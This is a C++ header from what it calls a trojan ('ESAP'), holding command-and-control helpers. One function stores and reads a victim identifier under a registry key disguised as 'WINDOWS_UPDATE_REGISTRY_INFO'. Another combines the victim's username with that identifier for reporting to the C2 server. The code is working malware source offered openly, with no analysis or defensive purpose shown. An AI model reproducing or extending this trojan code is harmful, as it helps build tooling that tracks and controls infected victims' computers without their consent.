/*
 ___ ___   _   ___ 
| __/ __| /_\ | _ \
| _|\__ \/ _ \|  _/
|___|___/_/ \_\_|  

ESAP: The Extremely Sophisticated And Potent Trojan
<c2.hpp>
This header is for important operations with the C2 server, such as getting the UID.

*/

#include <iostream>
#include <windows.h>

#pragma once

std::string GetUID() {

    std::string uid;
    HKEY hKey;
    char buffer[1024];
    DWORD dwBufSz = sizeof(buffer);
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "WINDOWS_UPDATE_REGISTRY_INFO", 0, KEY_READ, &hKey) == ERROR_SUCCESS){
        if (RegQueryValueEx(hKey, "GENERATED_UUID", NULL, NULL, reinterpret_cast<LPBYTE>(buffer), &dwBufSz) == ERROR_SUCCESS){
            uid = buffer;
            RegCloseKey(hKey);
            return uid;
        }
    }

    // not found
    UUID uuid;
    UuidCreate(&uuid);
    unsigned char* ucUUID;
    UuidToString(&uuid, &ucUUID);
    uid = reinterpret_cast<char*>(ucUUID);
    DWORD dwDisposition;
    RegCreateKeyEx(HKEY_CURRENT_USER, "WINDOWS_UPDATE_REGISTRY_INFO", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition);
    RegSetValueEx(hKey, "GENERATED_UUID", 0, REG_SZ, ucUUID, uid.size());
    RpcStringFreeA(&ucUUID);
    RegCloseKey(hKey);
    return uid;
}

std::string GetID() {
    char chUsername[256];
    DWORD dwUsernameSz = 256;
    GetUserName(chUsername, &dwUsernameSz);
    std::string username = chUsername;
    std::string uid = GetUID();
    return username + " (" + uid + ")";
}